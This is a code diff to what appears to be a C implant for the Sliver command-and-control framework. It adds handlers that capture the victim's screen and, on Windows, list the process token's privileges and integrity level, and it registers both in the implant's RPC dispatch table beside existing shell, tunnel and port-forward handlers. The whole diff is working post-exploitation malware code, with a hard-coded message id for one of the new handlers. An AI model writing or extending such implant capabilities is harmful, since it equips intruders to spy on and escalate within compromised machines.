@@ -9,6 +9,8 @@
 #include "sliver/fs.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
+#include "sliver/privs.h"
+#include "sliver/screenshot.h"
 #include "sliver/proc.h"
 
 #define SLIVER_LS_MAX_ENTRIES 4096
@@ -741,6 +743,42 @@ static int handle_reg_values(const sliver_envelope_t *req, sliver_buf_t *out) {
 }
 #endif /* _WIN32 */
 
+
+/* --- screenshot / getprivs ---------------------------------------------- */
+static int handle_screenshot(const sliver_envelope_t *req, sliver_buf_t *out) {
+  uint8_t *data = NULL;
+  size_t len = 0;
+  int rc;
+
+  (void)req;
+  if (sliver_screenshot_capture(&data, &len) != 0) {
+    return sliver_screenshot_encode(out, NULL, 0, "screenshot: capture failed");
+  }
+  rc = sliver_screenshot_encode(out, data, len, NULL);
+  free(data);
+  LOG_DEBUG("rpc: screenshot %u bytes", (unsigned)len);
+  return rc;
+}
+
+#if defined(_WIN32)
+static int handle_getprivs(const sliver_envelope_t *req, sliver_buf_t *out) {
+  sliver_priv_t privs[64];
+  char integrity[32];
+  char proc_name[256];
+  int n;
+
+  (void)req;
+  integrity[0] = 0;
+  proc_name[0] = 0;
+  n = sliver_getprivs(privs, 64, integrity, sizeof(integrity), proc_name, sizeof(proc_name));
+  LOG_DEBUG("rpc: getprivs -> %d privileges (%s)", n, integrity);
+  if (n < 0) {
+    return sliver_getprivs_encode(out, NULL, 0, NULL, NULL, "getprivs: token query failed");
+  }
+  return sliver_getprivs_encode(out, privs, n, integrity, proc_name, NULL);
+}
+#endif
+
 static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_LS_REQ, SLIVER_MSG_LS, sliver_rpc_handle_ls},
     {SLIVER_MSG_PWD_REQ, SLIVER_MSG_PWD, sliver_rpc_handle_pwd},
@@ -758,6 +796,10 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
     {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
+    {SLIVER_MSG_SCREENSHOT_REQ, SLIVER_MSG_SCREENSHOT, handle_screenshot},
+#if defined(_WIN32)
+    {87, 87, handle_getprivs},
+#endif
     {SLIVER_MSG_IFCONFIG_REQ, SLIVER_MSG_IFCONFIG, handle_ifconfig},
     {SLIVER_MSG_NETSTAT_REQ, SLIVER_MSG_NETSTAT, handle_netstat},
     {SLIVER_MSG_MOUNT_REQ, SLIVER_MSG_MOUNT, handle_mount},
@@ -828,6 +870,11 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
+
+
+
+
 
 
 
